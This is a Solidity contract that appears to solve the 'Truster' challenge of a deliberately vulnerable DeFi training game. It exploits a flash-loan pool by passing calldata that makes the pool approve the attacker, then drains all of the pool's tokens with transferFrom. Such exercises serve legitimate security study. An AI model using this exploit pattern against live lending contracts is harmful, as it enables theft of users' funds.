// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./TrusterLenderPool.sol";

contract AttackTrusterLenderPool {
    TrusterLenderPool public pool;
    IERC20 public immutable damnValuableToken;

    constructor(address _pool, address _tokenAddress) {
        pool = TrusterLenderPool(_pool);
        damnValuableToken = IERC20(_tokenAddress);
    }

    function attack(address _attacker, uint _poolAmount) public {
        // approve this contract to spend
        // and then transfer all the tokens from the pool to the attacker addresss
        pool.flashLoan(0, _attacker, address(damnValuableToken), abi.encodeWithSignature("approve(address,uint256)", address(this), _poolAmount));
        damnValuableToken.transferFrom(address(pool), _attacker, _poolAmount);
    }
}

/*
        uint256 borrowAmount,
        address borrower,
        address target,
        bytes calldata data
*/